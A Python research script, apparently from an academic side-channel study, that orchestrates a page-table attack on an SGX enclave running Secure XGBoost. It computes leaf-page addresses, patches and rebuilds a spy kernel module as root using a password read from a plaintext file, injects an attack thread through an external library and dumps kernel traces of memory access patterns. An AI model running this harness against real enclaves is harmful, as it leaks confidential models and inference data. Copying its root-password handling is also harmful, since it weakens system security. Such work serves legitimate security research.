from pathlib import Path
import re
import sys
import time
import pexpect
import securexgboost as xgb
import os
import pandas as pd
import argparse
from sklearn.metrics import accuracy_score
import subprocess

os.environ['PYTHONHASHSEED'] = "42"

HOME_DIR =  os.path.abspath('') + "/../../"
CURRENT_DIR = os.path.abspath('')
DATA_DIR = os.path.join(HOME_DIR, 'do-enhanced/data')

username = "user1"
KEY_FILE = "key.txt"
ENCLAVE_FILE = HOME_DIR + "build/enclave/xgboost_enclave.signed"
PUB_KEY = HOME_DIR + "config/user1.pem"
CERT_FILE = HOME_DIR + "config/{0}.crt".format(username)


from functools import wraps

def timer(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        start_time = time.perf_counter()
        result = func(*args, **kwargs)
        end_time = time.perf_counter()
        print(f"Function '{func.__name__}' elapsed time: {end_time - start_time:.4f} seconds")
        return result
    return wrapper

@timer
def predict(booster, dtest):
    enc_preds, num_preds = booster.predict(dtest, decrypt=False)
    preds = booster.decrypt_predictions(enc_preds, num_preds)

    return preds

def initialize_xgboost(username=username, key_file=KEY_FILE, pub_key=PUB_KEY, cert_file=CERT_FILE, enclave_image=ENCLAVE_FILE):
    xgb.init_client(user_name=username, sym_key_file=key_file, priv_key_file=pub_key, cert_file=cert_file)
    xgb.init_server(enclave_image=enclave_image, client_list=[username])
    # Pass in `verify=False` if running in simulation mode.
    xgb.attest(verify=True)

def parse_addresses_info(addresses_info):
    """解析节点地址"""
    matches = re.findall(r'Node\[(\d+)\] addr: (0x[0-9a-fA-F]+)', addresses_info)
    addresses = [(int(idx), int(addr, 16)) for idx, addr in matches]
    return addresses

def to_page_addr(addr):
    """获取其所在页面地址（按 4KB 页对齐）"""
    page_size = 0x1000
    page_addrs = addr & ~(page_size - 1)
    return page_addrs

def get_leaf_page_addr(addresses_info):
    # 解析节点地址
    addresses = parse_addresses_info(addresses_info)

    # 找出叶子节点地址（索引 >= n//2）
    n = len(addresses)
    leaf_addrs = [addr for idx, addr in addresses if idx >= n // 2]

    # 获取其所在页面地址（按 4KB 页对齐）
    page_addrs = set([to_page_addr(addr) for addr in leaf_addrs])

    # 输出为有序十六进制字符串列表
    result = [addr for addr in sorted(page_addrs)]
    return result

def to_cpp_array(name, addrs):
    lines = []
    lines.append(f"uint64_t {name}[] = {{")
    for addr in addrs:
        lines.append(f"    {addr},")
    lines.append("};")
    return "\n".join(lines)

def get_attack_addr(booster, saveFile=None, monitor_pte_option=0):
    """获取攻击地址"""
    addresses_info = booster.get_addresses_info()

    # set monitor_pte to tree_info address
    monitor_pte = addresses_info[0].split(":")[1].strip()
    monitor_pte = int(monitor_pte, 16)
    # set monitor_pte to the root node address of the first tree if monitor_pte_option
    if monitor_pte_option:
        match = re.findall(r'Node\[0\] addr: (0x[0-9a-fA-F]+)', addresses_info[1])
        if match:
            monitor_pte = int(match.group(0), 16)

    pte_sets = []
    for info in addresses_info:
        leaf_page_addrs = get_leaf_page_addr(info)
        pte_sets.extend(leaf_page_addrs)

    if saveFile:
        with open(saveFile, 'w') as f:
            f.write("monitor_pte: " + hex(monitor_pte) + "\n")
            f.write("pte_sets:\n")
            f.write(to_cpp_array("pte_sets", pte_sets) + "\n")
            f.write("attack addresses info:" + "\n")
            f.write(str(addresses_info) + "\n")
        
    print(f"Get attack addresses successfully, monitor_pte: {hex(monitor_pte)}, number of pte_sets: {len(pte_sets)}")

    return monitor_pte, pte_sets

def dump_model_to_file(booster, output_file):
    with open(output_file, 'w') as f:
        f.write(str(booster.get_dump()))
    print(f"Model dumped to {output_file} successfully.")

def load_model_and_data(dataset, max_depth, num_rounds, data_size):
    initialize_xgboost()
    data_dir = os.path.join(DATA_DIR, dataset)

    # Load the test data
    enc_test_data = os.path.join(data_dir, f"data{data_size}.enc")
    dtest = xgb.DMatrix({username: enc_test_data})
    print(f"DMatrix with datasize {data_size} loaded successfully.")

    # Load the booster model
    model_name = f"modeld{max_depth}n{num_rounds}.model"
    booster = xgb.Booster(model_file=os.path.join(data_dir, model_name))
    print(f"Booster with max_depth {max_depth} and {num_rounds} trees loaded successfully.")

    return booster, dtest

def update_pte_utils(c_file_path, new_c_adr, new_leaf_pages):
    c_file = Path(c_file_path)
    if not c_file.exists():
        raise FileNotFoundError(f"{c_file} 不存在")

    text = c_file.read_text()

    # 1. 精确替换 C_ADR
    text, count1 = re.subn(
        r"(#define\s+C_ADR\s+)0x[0-9a-fA-F]+",
        rf"\g<1>{hex(new_c_adr)}",
        text
    )
    if count1 == 0:
        raise ValueError("未找到 #define C_ADR 行，替换失败")

    # 2. 精确替换 leaf_pages 数组
    leaf_array_str = ",\n        ".join(hex(p) for p in new_leaf_pages)
    text, count2 = re.subn(
        r"(uint64_t\s+leaf_pages\[\]\s*=\s*\{)[^\}]*\}",
        rf"\g<1>\n        {leaf_array_str}\n    }}",
        text,
        flags=re.S
    )
    if count2 == 0:
        raise ValueError("未找到 leaf_pages 数组，替换失败")

    # 写回文件
    c_file.write_text(text)


def run_as_root_with_su(password_file, workdir, command):
    """
    使用 su 切换 root 执行命令
    """
    pw_path = Path(password_file)
    if not pw_path.exists():
        raise FileNotFoundError(f"密码文件不存在: {pw_path}")
    password = pw_path.read_text().strip()

    full_cmd = f"cd {workdir} && {command}"

    # 启动 su 命令，pexpect 会自动创建一个伪终端
    child = pexpect.spawn(f"su -c '{full_cmd}'", encoding="utf-8", timeout=30)

    # 处理可能的几种密码提示
    index = child.expect([
        "Password:",
        "密码：",
        "Password for root:",
        pexpect.EOF,
        pexpect.TIMEOUT
    ])

    if index in [0, 1, 2]:
        child.sendline(password)
    else:
        print("没有检测到密码提示，可能 su 配置不需要密码或被限制")
    
    # 获取全部输出
    child.expect(pexpect.EOF)
    output = child.before

    return child.exitstatus, output


def clear_trace():
    subprocess.run(['sudo', 'sh', '-c', 'echo > /sys/kernel/debug/tracing/trace'],
                   check=True)

def dump_trace_to_file(output_file):
    with open(output_file, 'w') as f:
        subprocess.run(['sudo', 'cat', '/sys/kernel/debug/tracing/trace'], stdout=f, check=True)


def attack(dataset="higgs", max_depth=9, num_rounds=10, data_size=1000):
    """执行一次攻击流程"""
    try:
        # load model and data and get attack addresses
        booster, dtest = load_model_and_data(dataset, max_depth, num_rounds, data_size)
        dump_model_to_file(booster, 'bst_dump.txt')
        monitor_pte, pte_sets = get_attack_addr(booster, saveFile='addr_info.txt', monitor_pte_option=0)

        # update pte_utils.c with new addresses and recompile
        update_pte_utils("../spy-kernel/pte_utils.c", monitor_pte, pte_sets)
        code, out = run_as_root_with_su(
            password_file="./root_password.txt",
            workdir="../spy-kernel",
            command="make remake"
        )
        print("退出码:", code)
        print("执行输出:\n", out)

        # 清空 trace 文件（需要 root 权限）
        clear_trace() 
        
        ### attack helpers
        import ctypes
        SGX_ATTACK_LIB = HOME_DIR + "SGX_PTE-Attack/spy-user/libsgx_pte_attack.so"
        lib_attack = ctypes.CDLL(SGX_ATTACK_LIB)
        ### inject attack thread
        lib_attack.sgx_enter_victim()
        print("Attack thread injected successfully.")

        preds = predict(booster=booster, dtest=dtest)
        print(preds)

        ### exit attack thread
        lib_attack.sgx_exit_victim()

        # 读取 trace 内容并写入 access_patterns.txt
        dump_trace_to_file('access_patterns.txt')

        print("Tracing completed successfully.")

    except PermissionError as e:
        print("Permission denied. Please run this script as root using sudo.")
        print(f"Details: {e}")
    except Exception as e:
        print(f"Error: {e}")


def merge_pte_masks(input_file, output_file):
    """
    从输入文件中提取访问模式掩码，过滤无效项，并合并递减序列的掩码（按位 OR 运算），保存到输出文件。
    
    参数：
        input_file (str): 输入文件路径
        output_file (str): 输出文件路径
    """
    # 读取文件内容
    with open(input_file, 'r') as f:
        lines = f.readlines()

    # 1. 提取所有掩码（匹配 'with PTE set ' 后的十六进制数）
    pattern = re.compile(r'with PTE set (0x[0-9a-fA-F]+)')
    masks = []
    for line in lines:
        match = pattern.search(line)
        if match:
            masks.append(match.group(1))

    # 2. 去除无效项 '0x0'
    masks = [m for m in masks if m.lower() != '0x0']

    # 转换为整数形式
    mask_ints = [int(m, 16) for m in masks]

    # 3. 合并多个顺序排列且位数逐渐减小的掩码（按位 OR 运算）
    merged_masks = []
    current_or = 0
    prev_bits = None

    for m in mask_ints:
        bit_count = m.bit_length()
        if prev_bits is None:
            # 第一个掩码
            current_or = m
        elif bit_count <= prev_bits:
            # 位数不增加，说明是同一组
            current_or |= m
        else:
            # 位数增加，说明新的一组开始
            merged_masks.append(current_or)
            current_or = m
        prev_bits = bit_count

    # 添加最后一组
    if current_or != 0:
        merged_masks.append(current_or)

    # 4. 保存结果
    with open(output_file, 'w') as f:
        for m in merged_masks:
            f.write(hex(m) + '\n')
    
    print(f"处理完成，共得到 {len(merged_masks)} 个完整掩码，结果已保存到: {output_file}")

    return merged_masks

def clear_file(dst_file):
    """清空目标文件内容"""
    if os.path.exists(dst_file):
        print(f"Clearing file: {dst_file}")
        open(dst_file, "w").close()
    else:
        print(f"File not found: {dst_file}")

def append_file_content(src_file, dst_file):
    """把 src_file 的内容追加到 dst_file 末尾"""
    with open(src_file, "r", encoding="utf-8") as f_src, \
         open(dst_file, "a", encoding="utf-8") as f_dst:
        for line in f_src:
            f_dst.write(line)

if __name__ == "__main__":
    # base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../do-enhanced"))
    # sys.path.append(base_dir)
    # import process_dataset

    # process_dataset.test()

    data_size = 500
    dataset = "higgs"

    attack(dataset="higgs", max_depth=8, num_rounds=5, data_size=500)
    # masks = merge_pte_masks('access_patterns.txt', 'data/merged_masks.txt')

    # if len(masks) == data_size:
    #     append_file_content('data/merged_masks.txt', 'data/merged_masks_all.txt')
    #     data_dir = os.path.join(DATA_DIR, dataset)
    #     test_data = os.path.join(data_dir, f"data{data_size}.txt")
    #     append_file_content(test_data, f'data/data_all.txt')
